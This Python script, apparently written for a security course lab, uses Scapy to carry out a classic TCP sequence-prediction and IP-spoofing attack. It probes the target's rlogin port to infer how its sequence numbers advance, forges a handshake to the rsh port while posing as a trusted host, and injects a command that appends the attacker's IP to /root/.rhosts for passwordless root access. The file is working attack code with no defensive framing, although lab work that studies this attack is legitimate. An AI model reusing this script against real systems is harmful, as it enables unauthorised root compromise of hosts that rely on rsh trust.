from scapy.all import *

import sys

if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]
    my_ip = get_if_addr(sys.argv[1])

    #TODO: figure out SYN sequence number pattern
    lastSeq = 0
    pattern = 0
	
    for _ in range(3):
		# send simple syn packet (port 513 is depreciated port that can be
		# used for malicous attacks. It sends the synach to attacker.
        ip = IP(dst = target_ip)
        tcp = TCP(sport = 777, dport = 513, flags = "S")
        res = sr1(ip / tcp, verbose = 0)
		
        pattern = res.seq - lastSeq
        lastSeq = res.seq
    
		# send a reset
        send(ip / TCP(sport = 777, dport = 513, flags = "R"), verbose = 0) 
	
    #TODO: TCP hijacking with predicted sequence number
    payload = "\0root\0root\0echo '" + my_ip + " root' >> /root/.rhosts\0"
    
	# send a SYN as attacker to recieve the sequence number of the second ack
    ip = IP(dst = target_ip)
    tcp = TCP(sport = 777, dport = 514, seq = 0, flags = "S")
    res = sr1(ip / tcp, timeout = 3, verbose = 0)
    
    # send a reset 
    send(ip / TCP(sport = 777, dport = 514, seq = 1, flags = "R"), verbose = 0)

	# Start handshake by sending SYN with rimmons IP addr
    seq = 0
    ip = IP(src = trusted_host_ip, dst = target_ip)
    tcp = TCP(sport = 777, dport = 514, seq = seq, flags = "S")
    send(ip / tcp, verbose = 0)
    
    # wait for ACK
    time.sleep(2)
    seq = seq + 1
    
    # send another ACK
    send(ip / TCP(sport = 777, dport = 514, seq = seq, ack =  res.seq + pattern + 1, flags = "A"), verbose = 0)
    
    # send payload via shell
    payload_packet = ip / TCP(sport = 777, dport = 514, seq = seq, ack = res.seq + pattern + 1, flags = "PA") / payload
    payload_packet.show()
    send(payload_packet, verbose = 0)
    
    # wait for ACK
    time.sleep(1)
    seq = seq + len(payload)
    
    # send a TCP reset for port 777
    send(ip / TCP(sport = 777, dport = 514, flags = "R"), verbose = 0)
    print("Spoofing Done!")
